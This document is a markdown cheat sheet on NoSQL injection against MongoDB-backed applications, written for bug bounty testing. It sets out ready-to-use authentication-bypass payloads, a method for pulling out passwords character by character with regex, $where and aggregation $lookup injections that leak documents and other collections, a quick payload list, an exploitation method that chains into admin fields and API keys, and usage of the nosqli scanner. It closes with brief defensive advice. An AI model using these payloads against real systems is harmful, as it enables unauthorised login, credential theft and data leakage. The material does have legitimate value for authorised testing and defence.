



# 🧠 NoSQL Injection –  Cheat Sheet 

---

# Real Bug Bounty Targets

Common vulnerable areas:

- Login endpoints
    
- Search filters
    
- File download APIs
    
- GraphQL filters
    
- Chat apps
    
- Admin panels
    
- Export features

---

# 1️⃣ What is NoSQL Injection?

NoSQL Injection happens when user input is directly used inside a NoSQL query (MongoDB for example).

Instead of injecting SQL like:

```
' OR 1=1 --
```

We inject Mongo operators like:

```
$ne
$regex
$where
```

Most common target: **MongoDB**

---

# 2️⃣ When Should You Test?

Test NoSQL Injection when you see:

- JSON requests (POST / PUT)
    
- Login forms
    
- Search filters
    
- GraphQL filters
    
- API endpoints returning lists
    
- Parameters like:
    
    - filter
        
    - query
        
    - selector
        
    - where
        
    - id
        

🚩 Red Flag:  
If backend does something like:

```js
collection.find(req.body)
```

---

# 3️⃣ Basic Operators to Test

|Operator|Meaning|
|---|---|
|$ne|Not equal|
|$gt|Greater than|
|$lt|Less than|
|$regex|Regular expression|
|$exists|Field exists|
|$nin|Not in array|
|$where|Execute JavaScript|

---

# 4️⃣ Basic Authentication Bypass

### URL Form

```
username[$ne]=test&password[$ne]=test
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### JSON Form

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

If login works → vulnerable.

---

# 5️⃣ Extract Data with $regex (Blind Extraction)

### Step 1: Find Length

```
password[$regex]=.{1}
password[$regex]=.{2}
password[$regex]=.{3}
```

If true → correct length.

---

### Step 2: Extract Character by Character

```
password[$regex]=^a.*
password[$regex]=^b.*
password[$regex]=^c.*
```

Then:

```
^ad.*
^adm.*
^admi.*
```

Repeat until full password.

---

# 6️⃣ $where Injection (Very Dangerous)

If app uses:

```js
{ $where: "this.username == '" + username + "'" }
```

You can inject:

```
admin' || 1==1//
admin' || 'a'=='a
```

Equivalent of:

```
' OR 1=1 --
```

---

# 7️⃣ Time-Based NoSQL Injection

Used in:

CVE-2023-28359

Inject delay logic using `$where`.

If response is slower → condition is true.

Used to build blind oracle.

---

# 8️⃣ Type Confusion Injection

If backend expects:

```
fileId = "string"
```

Try sending:

```json
{ "$regex": ".*" }
```

If it returns first document → vulnerable.

Example:  
CVE-2022-35246

---

# 9️⃣ GraphQL → Mongo Injection

GraphQL resolver example:

```js
users.find(args.filter)
```

Payload:

```json
{
  "filter": { "$ne": {} }
}
```

If no filtering → vulnerable.

---

# 🔟 Aggregation Injection ($lookup Abuse)

If app uses:

```js
collection.aggregate()
```

Try injecting:

```json
{
  "$lookup": {
    "from": "users",
    "pipeline": [
      { "$match": { "password": { "$regex": ".*" } } }
    ],
    "as": "leak"
  }
}
```

This can read other collections.

---

# 1️⃣1️⃣ Error-Based Injection

If server leaks DB errors:

Inject:

```json
{
  "$where": "throw new Error(JSON.stringify(this))"
}
```

If error is returned → full document leak.

---

# 1️⃣2️⃣ Advanced: ORM-Level Injection (Mongoose)

Recent cases:

CVE-2024-53900  
CVE-2025-23061

If backend uses:

```js
.populate({ match: req.query })
```

Try injecting `$where`.

May lead to Node.js RCE.

---

# 1️⃣3️⃣ Quick Payload List

Try these quickly:

```
{$ne: 1}
{$gt: ""}
{$regex: ".*"}
{$exists: true}
'|| 1==1//
'|| 1==1%00
[$ne]=1
';sleep(5000);
```

---

# 1️⃣4️⃣ Testing Methodology (Step-by-Step)

### Step 1 — Detect

Send:

```
{"test":{"$ne":null}}
```

If behavior changes → injection.

---

### Step 2 — Bypass

Try:

```
{"username":{"$ne":null},"password":{"$ne":null}}
```

---

### Step 3 — Confirm

Use:

```
{"password":{"$regex":"^a"}}
```

Check response difference.

---

### Step 4 — Extract

Character by character using regex.

---

### Step 5 — Chain

Look for:

- Password reset
    
- Admin role field
    
- API keys
    
- S3 URLs
    
- Webhook configs
    

---

# 1️⃣6️⃣ How to Defend (For Reports)

Developers should:

- Reject keys starting with $
    
- Validate input types
    
- Use schema validation (Joi / Zod)
    
- Disable server-side JS
    
- Use allow-list operators only
    
- Never pass raw object to find()
    

---

# Example

```sh
nosqli scan -t http://localhost:4000/user/lookup?username=test

```

Output:

`Running Error based scan... Running Boolean based scan...  Found Error based NoSQL Injection:   URL: http://localhost:4000/user/lookup?=&username=test   param: username   Injection: username='`

Meaning:

- Parameter `username` is injectable
    
- Error-based injection detected
    
- Single quote broke query
    

---

# 3️⃣ Important Flags

|Flag|Meaning|
|---|---|
|-t|Target URL|
|-d|POST data|
|-r|Load raw request from file|
|-p|Proxy|
|-u|Custom user agent|
|--config|Config file|

---

# 4️⃣ GET Request Scan

`nosqli scan -t "http://site.com/login?user=test&pass=test"`

Tool will test:

- Error-based injection
    
- Boolean-based injection
    

---

# 5️⃣ POST Request Scan

Use `-d`:

`nosqli scan -t http://site.com/login \ -d "username=test&password=test"`

⚠️ Do NOT include injection payload manually.  
Tool will inject automatically.

---

# 6️⃣ Scan Using Burp/ZAP Request

Save request to file:

`request.txt`

Then run:

`nosqli scan -r request.txt`

Best method for:

- Complex headers
    
- Authenticated sessions
    
- API endpoints
    
- JSON requests

---
